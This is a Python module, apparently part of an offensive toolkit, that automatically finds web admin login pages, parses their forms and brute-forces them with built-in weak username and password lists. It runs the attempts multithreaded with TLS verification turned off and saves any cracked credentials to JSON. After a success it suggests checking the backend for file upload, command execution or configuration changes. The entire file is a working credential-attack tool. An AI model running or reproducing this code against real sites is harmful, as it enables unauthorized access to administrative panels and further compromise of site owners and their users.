#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
weblogin.py — Web 管理员后台爆破
自动识别登录表单 → 尝试常见弱口令 → 判断登录成功/失败
"""

import os, json, re, datetime, requests, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from tools import RESULTS_BASE

TOOL_NAME = "Web 后台登录爆破"
TOOL_ID = "weblogin"
TOOL_DESC = "自动识别管理员登录表单，尝试常见弱口令组合，通过响应差异判断是否登录成功"
TOOL_CATEGORY = "credential"

THREAD_COUNT = 5
TIMEOUT = 10

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

# 管理员弱口令（短小精悍，不会产生大量组合）
ADMIN_USERNAMES = [
    "admin", "Admin", "administrator", "root", "super", "sa",
    "manager", "webmaster", "sysadmin", "test",
]
ADMIN_PASSWORDS = [
    "admin", "admin123", "admin888", "123456", "12345678",
    "password", "pass123", "888888", "666666", "000000",
    "123456789", "admin@123", "test", "admin1", "root",
]

# 登录页关键词
LOGIN_KEYWORDS = [
    "login", "admin", "signin", "sign-in", "logon", "auth",
    "manage", "panel", "console", "dashboard", "backend",
    "houtai", "guanli", "administrator", "moderator",
    "wp-login", "user/login", "account/login", "member/login",
    "portal/login", "cms/login", "cms/admin",
]

# 登录失败特征
FAIL_SIGNATURES = [
    "密码错误", "用户名或密码错误", "密码不正确", "账号不存在",
    "登录失败", "验证失败", "用户名不存在", "账号或密码错误",
    "incorrect password", "invalid password", "wrong password",
    "login failed", "authentication failed", "invalid credentials",
    "bad credentials", "access denied", "unauthorized",
    "用户名或密码有误", "密码有误", "账号有误",
]

# 登录成功特征
SUCCESS_SIGNATURES = [
    "登录成功", "欢迎回来", "welcome back", "dashboard",
    "logout", "退出", "注销", "个人中心", "用户中心",
    "我的信息", "修改密码",
]


class Colors:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    B = '\033[94m'; C = '\033[96m'; BD = '\033[1m'; RS = '\033[0m'

class Logger:
    def info(self, m): print(f"{Colors.B}[INFO] {m}{Colors.RS}")
    def success(self, m): print(f"{Colors.G}[+] {m}{Colors.RS}")
    def warning(self, m): print(f"{Colors.Y}[!] {m}{Colors.RS}")
    def error(self, m): print(f"{Colors.R}[-] {m}{Colors.RS}")
    def raw(self, m): print(m)

logger = Logger()
found_lock = threading.Lock()


def find_login_pages(scan_result, base_url):
    """从扫描结果找出所有可能的登录页面"""
    directories = scan_result.get("directories", [])
    login_pages = []

    for d in directories:
        if d.get("status") != 200:
            continue
        path = d.get("path", "").lower()
        for kw in LOGIN_KEYWORDS:
            if kw in path and path not in login_pages:
                login_pages.append(d["path"])
                break

    return login_pages


def parse_login_form(html, page_url):
    """从 HTML 中提取登录表单的用户名/密码字段"""
    import html as html_mod

    # 找所有 <form>
    forms = []
    form_blocks = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)

    if not form_blocks:
        # 尝试不闭合的 form 或整页搜索 input
        form_blocks = [html]

    for fb in form_blocks[:3]:
        # 提取 action
        action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', fb, re.I)
        method_match = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', fb, re.I)

        # 提取所有 input
        inputs = []
        input_matches = re.findall(r'<input[^>]+>', fb, re.I)
        for inp in input_matches:
            name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
            type_m = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
            if name_m:
                inputs.append({
                    "name": name_m.group(1),
                    "type": type_m.group(1) if type_m else "text"
                })

        # 判断是否有密码框（登录表单的标志）
        has_password = any(i["type"].lower() == "password" for i in inputs)
        if not has_password:
            continue

        # 推断用户名/密码字段
        username_field = None
        password_field = None
        hidden_fields = {}

        for inp in inputs:
            n = inp["name"].lower()
            t = inp["type"].lower()
            if t == "password":
                password_field = inp["name"]
            elif t == "hidden":
                hidden_fields[inp["name"]] = ""
            elif not username_field and any(k in n for k in ["user", "name", "email", "login", "account", "id"]):
                username_field = inp["name"]

        # 如果没识别到用户名框，用第一个非hidden的text框
        if not username_field:
            for inp in inputs:
                if inp["type"].lower() in ("text", "email") and inp["name"].lower() not in hidden_fields:
                    username_field = inp["name"]
                    break

        if username_field and password_field:
            action_url = action_match.group(1) if action_match else page_url
            # 处理相对路径
            if action_url and not action_url.startswith("http"):
                if action_url.startswith("/"):
                    base = re.match(r'(https?://[^/]+)', page_url)
                    action_url = (base.group(1) if base else "") + action_url
                else:
                    action_url = page_url.rsplit("/",1)[0] + "/" + action_url

            forms.append({
                "page_url": page_url,
                "action": action_url,
                "method": (method_match.group(1) if method_match else "POST").upper(),
                "username_field": username_field,
                "password_field": password_field,
                "hidden_fields": hidden_fields,
            })

    return forms


def try_login(action_url, method, username, password, username_field,
              password_field, hidden_fields, session):
    """尝试一次登录"""
    data = {username_field: username, password_field: password}
    data.update(hidden_fields)

    try:
        if method == "POST":
            resp = session.post(action_url, data=data, headers=HEADERS,
                               timeout=TIMEOUT, verify=False, allow_redirects=False)
        else:
            params = data
            resp = session.get(action_url, params=params, headers=HEADERS,
                              timeout=TIMEOUT, verify=False, allow_redirects=False)
        return resp
    except:
        return None


def check_login_result(resp, login_page_url):
    """判断登录是否成功"""
    if not resp:
        return False, "连接失败"

    text = resp.text.lower() if resp.text else ""
    code = resp.status_code

    # 302/301 跳转 → 可能成功
    if code in [302, 301]:
        location = resp.headers.get("Location", "").lower()
        # 跳转到登录页 → 失败
        login_kw = [k.lower() for k in LOGIN_KEYWORDS]
        if any(kw in location for kw in ["login", "signin", "logon", "auth"]):
            return False, f"302→登录页 ({location[:50]})"
        # 跳转到其他 → 可能成功
        return True, f"302→{location[:50]}"

    # 页面中有成功签名
    for sig in SUCCESS_SIGNATURES:
        if sig.lower() in text:
            return True, f"响应含: {sig}"

    # 页面中有失败签名
    for sig in FAIL_SIGNATURES:
        if sig.lower() in text:
            return False, f"响应含: {sig}"

    # 无明确签名 → 长度差异判断
    return False, f"响应无明确信号 (状态{code}, {len(resp.text)}字节)"


def execute(scan_result, target_info):
    domain = target_info.get("domain", "unknown")
    base_url = target_info.get("base_url", "")
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    errors = []

    # 1. 找登录页
    login_pages = find_login_pages(scan_result, base_url)
    if not login_pages:
        return {
            "tool": "weblogin", "target": domain, "time": now,
            "status": "skipped",
            "summary": "未发现后台登录页面",
            "results": [], "errors": errors
        }

    logger.info(f"发现 {len(login_pages)} 个可能的后台登录页面")
    for lp in login_pages:
        logger.raw(f"  → {lp}")

    all_credentials = []
    tested_pages = 0

    for page_url in login_pages[:5]:  # 最多测5个
        logger.raw("")
        logger.info(f"分析登录表单: {page_url}")

        # 2. 获取页面HTML
        try:
            session = requests.Session()
            resp = session.get(page_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            html = resp.text
        except Exception as e:
            errors.append(f"{page_url}: {e}")
            continue

        # 3. 解析表单
        forms = parse_login_form(html, page_url)
        if not forms:
            logger.warning(f"未识别到登录表单: {page_url}")
            continue

        tested_pages += 1
        form = forms[0]  # 用第一个
        logger.info(f"表单: {form['method']} {form['action'][:60]}")
        logger.info(f"字段: 用户名={form['username_field']}  密码={form['password_field']}")

        # 4. 爆破
        total = len(ADMIN_USERNAMES) * len(ADMIN_PASSWORDS)
        logger.info(f"开始爆破 (用户{len(ADMIN_USERNAMES)}×密码{len(ADMIN_PASSWORDS)}={total}组合)")

        found = False
        count = 0

        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = {}
            for u in ADMIN_USERNAMES:
                for p in ADMIN_PASSWORDS:
                    f = executor.submit(try_login, form["action"], form["method"],
                                       u, p, form["username_field"],
                                       form["password_field"],
                                       form["hidden_fields"], session)
                    futures[f] = (u, p)

            for future in as_completed(futures):
                count += 1
                u, p = futures[future]
                try:
                    resp = future.result()
                    success, reason = check_login_result(resp, login_page_url=page_url)

                    if success:
                        logger.success(f"爆破成功! {page_url} → {u}:{p}")
                        logger.raw(f"  判定依据: {reason}")
                        with found_lock:
                            all_credentials.append({
                                "url": page_url,
                                "action": form["action"],
                                "username": u,
                                "password": p,
                                "reason": reason,
                                "username_field": form["username_field"],
                                "password_field": form["password_field"],
                            })
                        found = True
                        break
                except:
                    pass

                if count % 50 == 0:
                    logger.info(f"进度: {count}/{total}")

        if not found:
            logger.warning(f"未爆破成功: {page_url}")

    # 5. 汇总
    result = {
        "tool": "weblogin", "target": domain, "time": now,
        "status": "success" if all_credentials else "partial",
        "summary": f"检测 {len(login_pages)} 个后台，爆破 {tested_pages} 个登录页",
        "login_pages_found": login_pages,
        "credentials": all_credentials,
        "suggestion": "",
        "errors": errors
    }

    if all_credentials:
        result["summary"] += f"，发现 {len(all_credentials)} 组后台密码"
        result["suggestion"] = "登录后台后检查是否可上传文件/执行命令/修改配置"
    else:
        result["summary"] += "，未发现弱口令"
        result["suggestion"] = "可尝试加载更大的字典文件"

    # 保存
    out_dir = os.path.join(RESULTS_BASE, "weblogin")
    os.makedirs(out_dir, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(out_dir, f"result_{domain}_{ts}.json")
    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    return result
